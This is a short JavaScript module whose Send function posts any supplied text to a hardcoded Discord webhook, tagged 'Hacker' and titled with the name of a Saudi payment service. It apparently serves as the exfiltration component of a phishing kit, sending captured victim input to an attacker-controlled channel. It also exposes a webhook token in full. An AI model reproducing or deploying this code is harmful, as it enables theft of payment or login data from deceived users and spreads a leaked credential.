import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1316872804389486684/XHnS6WutACQueHj09DuP87tGdV6hTeEGEXh-ZGyRBFY7CDDg-Yz_MNrxDmQoNOAZlC3g",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
